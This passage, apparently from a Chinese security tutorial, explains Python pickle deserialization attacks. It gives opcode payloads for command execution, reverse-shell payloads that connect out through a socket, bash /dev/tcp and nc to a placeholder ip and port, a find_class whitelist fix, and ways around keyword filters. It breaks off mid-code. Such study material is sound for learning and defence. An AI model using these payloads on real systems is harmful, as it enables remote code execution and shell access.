class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/summary/python_unserialize-7.png"></p><blockquote><p>与php反序列化中的<code>$this-&gt;b = &amp;$this-&gt;a;</code>引用绕过类似，只不过python用的是import</p></blockquote><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>pickle中用来构造函数执行的字节码有四个个：<code>R</code>、<code>i</code>、<code>o</code>以及<code>b +__setstate__()</code></p><h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><p><a href="#a">上文</a>中提到的例子用的就是<code>R</code>来实现Rce</p><blockquote><p>R: 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><blockquote><p>相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_inst</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 前三行代码与c的代码一致，用来调用</span><br>    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    klass = self.find_class(module, name)<br>    <span class="hljs-comment"># 通过pop_mark()函数得到参数，利用_instantiate函数执行，将结果存入栈中</span><br>    self._instantiate(klass, self.pop_mark())<br>dispatch[INST[<span class="hljs-number">0</span>]] = load_inst<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_instantiate</span>(<span class="hljs-params">self, klass, args</span>):<br>    <span class="hljs-keyword">if</span> (args <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(klass, <span class="hljs-built_in">type</span>) <span class="hljs-keyword">or</span><br>        <span class="hljs-built_in">hasattr</span>(klass, <span class="hljs-string">&quot;__getinitargs__&quot;</span>)):<br>        <span class="hljs-keyword">try</span>:<br>            value = klass(*args)<br>        <span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;in constructor for %s: %s&quot;</span> %<br>                            (klass.__name__, <span class="hljs-built_in">str</span>(err)), sys.exc_info()[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">else</span>:<br>        value = klass.__new__(klass)<br>    self.append(value)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="o"><a href="#o" class="headerlink" title="o"></a>o</h3><blockquote><p>从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_obj</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 弹出栈中所有数据赋值给args</span><br>    args = self.pop_mark()<br>    <span class="hljs-comment"># 在args中弹出第一个作为类名</span><br>    cls = args.pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 利用_instantiate函数执行并将结果压回栈中</span><br>    self._instantiate(cls, args)<br>dispatch[OBJ[<span class="hljs-number">0</span>]] = load_obj<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="b-setstate"><a href="#b-setstate" class="headerlink" title="b + __setstate__()"></a>b + __setstate__()</h3><blockquote><p>使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):<br>    stack = self.stack<br>    <span class="hljs-comment"># 获取栈顶元素</span><br>    state = stack.pop()<br>    <span class="hljs-comment"># 获取栈中倒数第二个元素</span><br>    inst = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 获取倒数第二个元素的__setstate__属性</span><br>    setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">&quot;__setstate__&quot;</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-comment"># setstate 不为None则调用inst对象的__setstate，将state作为参数传递给它</span><br>    <span class="hljs-comment"># 一般不存在__setstate__方法，setstate(state)会造成任意函数调用</span><br>    <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        setstate(state)<br>        <span class="hljs-keyword">return</span><br>    slotstate = <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 如果state是元组类型且长度为2，则将其分解成state, slotstate</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>        state, slotstate = state<br><br>    <span class="hljs-keyword">if</span> state:<br>        inst_dict = inst.__dict__<br>        intern = sys.intern<br>        <span class="hljs-comment"># 遍历state字典，将键名赋值给inst_dict，键值直接赋值</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(k) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span>:<br>                inst_dict[intern(k)] = v<br>            <span class="hljs-keyword">else</span>:<br>                inst_dict[k] = v<br><br>    <span class="hljs-keyword">if</span> slotstate:<br>        <span class="hljs-comment"># 遍历slotstate字典，并将其键值对赋值给inst对象</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(inst, k, v)<br>dispatch[BUILD[<span class="hljs-number">0</span>]] = load_build<br></code></pre></td></tr></table></figure><p>因为一般不存在__setstate__，所以不会触发setstate(state)。但是如果手动压入一个字典<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>，执行<code>b</code>。就会添加一个新的键值对，再继续压入命令，再执行<code>b</code>时，<code>setstate</code>就不会为None了，而是我们传入的os.system，就是<code>os.system(state)</code>，而state就是我们传入的命令，从而完成rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = <span class="hljs-string">&quot;aa&quot;</span><br><br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Test</span><br><span class="hljs-string">)o(S&quot;__setstate__&quot;</span><br><span class="hljs-string">cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">dbS&quot;whoami&quot;</span><br><span class="hljs-string">b.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br>pickletools.dis(opcode)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">    0: (    MARK</span><br><span class="hljs-string">    1: c        GLOBAL     &#x27;__main__ Test&#x27;</span><br><span class="hljs-string">   16: )        EMPTY_TUPLE</span><br><span class="hljs-string">   17: o        OBJ        (MARK at 0)</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: S        STRING     &#x27;__setstate__&#x27;</span><br><span class="hljs-string">   35: c        GLOBAL     &#x27;os system&#x27;</span><br><span class="hljs-string">   46: d        DICT       (MARK at 18)</span><br><span class="hljs-string">   47: b    BUILD</span><br><span class="hljs-string">   48: S    STRING     &#x27;whoami&#x27;</span><br><span class="hljs-string">   58: b    BUILD</span><br><span class="hljs-string">   59: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>既然可以执行命令了，那么肯定可以反弹shell了，以下是几种payload</p><p><strong>利用i执行命令建立shell</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br>payload= <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;python -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;, port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br>payload2 = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">popen</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(payload)))<br></code></pre></td></tr></table></figure><p><strong>reduce直接执行nc命令</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e/bin/sh&#x27;)&quot;</span>,))<br><br>payload = Test()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(payload)))<br></code></pre></td></tr></table></figure><h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><blockquote><p><a href="https://github.com/eddieivan01/pker">pker</a>是由eddieivan01编写的以遍历Python AST的形式来自动化解析pickle opcode的工具。</p></blockquote><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复 "></a>漏洞修复 <a id="b"></h1><p>对于pickle反序列化漏洞，常见的修复方法是重写Unpickler.find_class()来限制全局变量</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># 需要限制反序列化对象时可以使用的类</span><br>safe_builtins = &#123;<br>    <span class="hljs-string">&#x27;range&#x27;</span>,        <span class="hljs-comment"># range类型</span><br>    <span class="hljs-string">&#x27;complex&#x27;</span>,      <span class="hljs-comment"># 复数类型</span><br>    <span class="hljs-string">&#x27;set&#x27;</span>,          <span class="hljs-comment"># 集合类型</span><br>    <span class="hljs-string">&#x27;frozenset&#x27;</span>,    <span class="hljs-comment"># 冻结集合类型</span><br>    <span class="hljs-string">&#x27;slice&#x27;</span>,        <span class="hljs-comment"># 切片类型</span><br>&#125;<br><br><span class="hljs-comment"># 定义RestrictedUnpickler类继承自pickle.Unpickler</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-comment">#重写了find_class方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># 如果被反序列化的对象的类属于builtins模块中的安全类，则返回该类</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># 如果不是安全类，就抛出异常，禁止反序列化</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><span class="hljs-comment"># 定义一个帮助函数restricted_loads来反序列化对象</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-comment"># 将传入的字符串s转换为bytes，并使用RestrictedUnpickler类反序列化</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br>opcode=<span class="hljs-string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span><br>restricted_loads(opcode)<br><br><br><span class="hljs-comment">###结果如下</span><br>Traceback (most recent call last):<br>...<br>_pickle.UnpicklingError: <span class="hljs-keyword">global</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">is</span> forbidden<br></code></pre></td></tr></table></figure><p>以上例子通过重写Unpickler.find_class()方法，限制调用模块只能为builtins，且函数必须在白名单内，否则抛出异常。</p><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><blockquote><p>利用opcode进行变量覆盖时，代码中可能会过滤了我们想要覆盖的属性关键字</p></blockquote><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br></code></pre></td></tr></table></figure><p>正常的opcode应该是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;key&#x27;</span><br><span class="hljs-string">S&#x27;123&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>方法一：十六进制</strong></p><p>因为 S 操作符是可以识别十六进制的，所以这里也可以对字符进行十六进制编码来绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># S&#x27;key&#x27; = S&#x27;\x6B\x65\x79&#x27;</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;\\x6B\\x65\\x79&#x27;</span><br><span class="hljs-string">S&#x27;111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">变量的值为:123</span><br><span class="hljs-string">变量的值为:111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>方法二：unicode编码</strong></p><p>同样的，V 操作符也可以识别unicode编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># S&#x27;key&#x27; = V\u006b\u0065\u0079</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(V\u006b\u0065\u0079</span><br><span class="hljs-string">S&#x27;111111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">变量的值为:123</span><br><span class="hljs-string">变量的值为:111111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>方法三：利用内置函数获取关键字</strong></p><p>在python中，当我们导入某个模块后，可以通过<code>dir(sys.modules[&#39;xxx&#39;])</code>来获取其全部属性</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;secret&#x27;</span>]))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;key&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>但是因为pickle不持支列表索引和字典索引，所以需要用<code>reversed()+next()</code>来获取元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;secret&#x27;</span>]))))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">key</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>转换成opcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造出dir</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造reversed</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造next</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 变量覆盖</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">((((c__main__</span><br><span class="hljs-string">secret</span><br><span 